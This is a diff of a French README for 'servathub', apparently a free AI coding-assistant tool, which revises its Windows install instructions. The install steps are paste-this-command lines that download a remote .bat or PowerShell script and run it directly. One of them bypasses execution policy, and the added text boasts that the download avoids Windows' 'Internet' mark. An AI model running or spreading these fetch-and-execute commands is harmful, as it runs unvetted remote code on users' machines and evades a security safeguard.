@@ -6,13 +6,15 @@ Assistant de codage IA gratuit basé sur l'interface de chat, avec le modèle **
 - 🔓 Modèle unique : DeepSeek V4 Flash — illimité
 - 🔑 Chaque utilisateur se connecte avec son propre compte (gratuit)
 
-## Installation (Windows)
+## Installation (Windows) — commande simple
 
 Ouvre un **invite de commandes (cmd)** et colle :
 
 ```cmd
-powershell -NoProfile -ExecutionPolicy Bypass -c "irm https://raw.githubusercontent.com/tiktokservat7-stack/servathub/main/install.ps1 | iex"
+curl -fsSL https://raw.githubusercontent.com/tiktokservat7-stack/servathub/main/install.bat -o "%TEMP%\sv-install.bat" && "%TEMP%\sv-install.bat"
 ```
+
+C'est l'équivalent Windows de `curl | bash` : le script télécharge `servathub.exe` + `tree-sitter.wasm` (via curl, sans barre de progression ni marque « Internet »), les installe dans `%USERPROFILE%\servathub`, ajoute le dossier au PATH et ferme automatiquement une ancienne version si elle tourne.
 
 Puis **ouvre un nouveau cmd** et tape :
 
@@ -20,7 +22,11 @@ Puis **ouvre un nouveau cmd** et tape :
 servathub
 ```
 
-Au premier lancement, connecte-toi avec un compte gratuit sur freebuff.com (la page de connexion s'ouvre toute seule).
+### Alternative (PowerShell)
+
+```cmd
+powershell -NoProfile -ExecutionPolicy Bypass -c "irm https://raw.githubusercontent.com/tiktokservat7-stack/servathub/main/install.ps1 | iex"
+```
 
 ## Désinstallation (Windows)
 
@@ -34,7 +40,8 @@ Le script ferme servathub s'il tourne, supprime le dossier `%USERPROFILE%\servat
 
 ## Manuel
 
-L'installeur copie les fichiers dans `%USERPROFILE%\servathub` et ajoute ce dossier au PATH de l'utilisateur.
+- L'installeur copie les fichiers dans `%USERPROFILE%\servathub` et ajoute ce dossier au PATH de l'utilisateur.
+- Au premier lancement, connecte-toi avec un compte gratuit sur freebuff.com (la page de connexion s'ouvre toute seule).
 
 ## Remarque
 
